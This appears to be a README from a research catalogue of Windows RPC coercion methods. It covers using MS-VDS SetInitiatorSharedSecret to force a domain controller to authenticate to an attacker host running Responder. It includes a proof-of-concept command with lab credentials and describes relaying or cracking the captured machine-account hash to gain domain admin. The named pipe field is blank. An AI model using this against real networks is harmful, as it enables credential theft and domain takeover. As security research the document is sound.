# MS-VDS - Remote call to IVdsServiceIscsi::SetInitiatorSharedSecret (opnum 8)

## Summary

 - **Protocol**: [[MS-VDS]: Virtual Disk Service (VDS) Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-vds/90977af2-515e-4fbd-809c-fdb280ab48db)

 - **Protocol UUID**: 118610b7-8d94-4030-b5b8-500889788e4e

 - **Protocol version**: 0.0

 - **SMB Named pipe**: ``

 - **Function name**: [`IVdsServiceIscsi::SetInitiatorSharedSecret`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-vds/d9179d8c-ece6-4e81-98ed-2fcca7ff6c25)

 - **Function operation number**: `8`

 - **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `` and bind to the desired [`MS-VDS`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-vds/90977af2-515e-4fbd-809c-fdb280ab48db) protocol (with uuid `118610b7-8d94-4030-b5b8-500889788e4e` and version `0.0`) in order to perform remote procedure calls to functions in the [`MS-VDS`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-vds/90977af2-515e-4fbd-809c-fdb280ab48db) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `` This pipe is connected to the protocol [[MS-VDS]: Virtual Disk Service (VDS) Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-vds/90977af2-515e-4fbd-809c-fdb280ab48db) and allows to call RPC functions of this protocol. We will then call the remote [`IVdsServiceIscsi::SetInitiatorSharedSecret`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-vds/d9179d8c-ece6-4e81-98ed-2fcca7ff6c25) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
IVdsServiceIscsi::SetInitiatorSharedSecret('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
HRESULT SetInitiatorSharedSecret(
   [in, unique] VDS_ISCSI_SHARED_SECRET* pInitiatorSharedSecret,
   [in] VDS_OBJECT_ID targetId
 );
```

## References

 - Documentation of protocol [MS-VDS]: Virtual Disk Service (VDS) Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-vds/90977af2-515e-4fbd-809c-fdb280ab48db

 - Documentation of function `IVdsServiceIscsi::SetInitiatorSharedSecret`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-vds/d9179d8c-ece6-4e81-98ed-2fcca7ff6c25